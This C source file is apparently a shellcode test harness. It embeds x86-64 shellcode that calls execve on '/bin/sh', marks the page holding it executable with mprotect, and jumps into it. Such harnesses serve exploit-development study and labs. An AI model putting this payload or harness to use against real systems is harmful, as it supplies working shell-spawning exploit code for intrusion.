#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
//shellcode tester by: Andrew Bellini
//shellcode by: Amr Alasmer

char *code ="\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x00\x51\x48\xc7\xc0\x3b\x00\x00\x00\x48\x89\xe7\x48\x31\xd2\x48\x31\xf6\x0f\x05";
int main(int argc,char** argv){

    size_t page_size = sysconf(_SC_PAGESIZE);

    // Align the shellcode array's memory address to the page boundary
    void *code_page = (void *)((size_t)code & ~(page_size - 1));

    // Mark the memory region as executable
    if (mprotect(code_page, page_size, PROT_READ | PROT_WRITE | PROT_EXEC) != 0) {
        perror("mprotect");
        return 1;
    }

    void (*shell)();
    shell=(void (*)())code;
    shell();

    (*shell)(); 

    // void (*malware)()=(void(*)())shellcode;
    // malware();

    return 0;
}

    
